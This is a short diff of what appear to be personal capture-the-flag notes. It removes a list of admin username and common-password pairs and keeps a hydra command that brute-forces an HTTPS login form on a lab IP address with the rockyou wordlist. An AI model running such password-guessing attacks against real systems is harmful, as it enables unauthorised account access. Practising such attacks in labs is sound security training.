@@ -1,21 +1,6 @@
 that's not true, sadly ><
 ****
-admin/123456
-admin/123456789
-admin/12345
-admin/password
-admin/iloveyou
-admin/princess
-admin/1234567
-admin/rockyou
-admin/12345678
-admin/abc123
-admin/nicole
-admin/daniel
-admin/babygirl
-admin/monkey
-admin/lovely
-admin/jessica
+
 ****
 
 `sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.42.179 -s 10000 https-post-form "/:user=^USER^&pass=^PASS^:F=Login failed. Please try again." -o output_hydra2`
